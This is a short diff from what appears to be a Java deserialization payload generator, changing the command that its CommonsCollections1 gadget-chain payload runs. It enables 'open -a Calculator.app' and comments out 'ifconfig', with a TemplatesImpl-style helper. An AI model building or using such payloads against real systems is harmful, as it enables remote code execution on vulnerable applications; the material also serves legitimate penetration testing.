@@ -33,8 +33,8 @@ public class CommonsCollections1 implements ObjectPayload<Object> {
         SinksHelper sinksHelper = new SinksHelper();
         sinksHelper.setSink(CommonsCollections1.class.getAnnotation(Sink.class).value()[0]);
         sinksHelper.setEnchant(EnchantType.DEFAULT);
-//        sinksHelper.setCommand("open -a Calculator.app");
-        sinksHelper.setCommand("ifconfig");
+        sinksHelper.setCommand("open -a Calculator.app");
+//        sinksHelper.setCommand("ifconfig");
         JavaClassHelper javaClassHelper = new JavaClassHelper();
         javaClassHelper.setExtendsAbstractTranslet(true);
         sinksHelper.setJavaClassHelper(javaClassHelper);
